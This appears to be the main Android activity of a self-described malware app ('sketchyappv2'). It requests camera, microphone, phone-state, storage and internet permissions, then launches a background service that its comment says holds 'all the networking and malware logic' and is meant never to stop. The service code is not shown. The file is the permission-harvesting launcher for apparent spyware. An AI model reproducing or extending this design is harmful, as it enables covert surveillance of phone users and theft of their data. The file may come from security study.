package com.twygonik.sketchyappv2;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.FileProvider;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    public static final int PERMISSION_ALL = 1; // dummy variable for requesting permissions
    static final int REQUEST_IMAGE_CAPTURE = 1; // Used for picture capture
    /*
    The Main activity
    Anything dealing with the view is done here, including permissions

     */
    private final String LOG_TAG = "MainActivity";
    String mCurrentPhotoPath; // path to the photo

    public static boolean hasPermissions(Context context, String... permissions) {
        // Helper method for permissioning
        // If any permission is not granted, it returns false
        // Otherwise it returns true
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //dispatchTakePictureIntent();
        Log.e(LOG_TAG, "MainActivity onCreate event");
        // We check if the app has the proper permissions
        // If it already has it, we start the service
        // If it doesn't, we ask for permissions
        String[] PERMISSIONS = {Manifest.permission.INTERNET, Manifest.permission.READ_PHONE_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO};
        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL); // show the permission prompt
        } else {
            startService(this.findViewById(R.id.activity_main)); // NOTE: Service is NOT started if permissions are not granted
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions,
                                           int[] grantResults) {
        /*
        Handles the result of requesting permissions
        Note: if permissions are not granted, a toast message appears asking
        to grant permissions manually
        if permissions are granted, it starts the background service
         */
        boolean granted = false;
        switch (requestCode) {
            case PERMISSION_ALL: {
                if (grantResults.length > 0) {
                    for (int i = 0; i < permissions.length; i++) {
                        // Check that each permissions is granted
                        if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                            granted = false;
                            break;
                        } else {
                            granted = true;
                        }
                    }
                    if (granted) {
                        Log.e(LOG_TAG, "All Permissions Granted!");
                        // The permissions were granted, start the background service
                        startService(this.findViewById(R.id.activity_main));
                    } else {
                        // If a permission is not granted, show a message to the user and do nothing
                        Toast.makeText(this.findViewById(R.id.activity_main).getContext(), "Please Manually accept all permissions and relaunch app!", Toast.LENGTH_LONG).show();
                    }
                } else {
                    Toast.makeText(this.findViewById(R.id.activity_main).getContext(), "Please Manually accept all permissions and relaunch app!", Toast.LENGTH_LONG).show();
                }
                return;
            }
        }
    }

    public void startService(View view) {
        // just calls the service where all the networking and malware logic lies
        Log.e(LOG_TAG, "Starting Service");
        startService(new Intent(getBaseContext(), BackgroundService.class)); // The context is used for the UUID generation in the background service
    }

    public void stopService(View view) {
        // stops the service
        // we want the service to run all the time, so this is never called
        Log.e(LOG_TAG, "Stopping Service");
        stopService(new Intent(getBaseContext(), BackgroundService.class));
    }


    private void dispatchTakePictureIntent() {
        // Used to create the intent and ask the user to take a picture
        // Wasn't able to get working
        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {

            File photoFile = null;
            try {
                photoFile = createImageFile();
            } catch (IOException ex) {
                Log.e(LOG_TAG, "Error when creating file");
            }
            if (photoFile != null) {
                Uri photoURI = FileProvider.getUriForFile(this, "com.example.android.fileprovider", photoFile);
                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, photoURI);
                startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
            }

        }
    }

    private File createImageFile() throws IOException {
        // Create an image file
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
        String imageFileName = "JPEG_" + "testphoto" + "_";
        File storageDir = getExternalFilesDir(Environment.DIRECTORY_DCIM);
        File image = File.createTempFile(imageFileName, ".jpg", storageDir);
        mCurrentPhotoPath = image.getAbsolutePath();
        return image;
    }


}
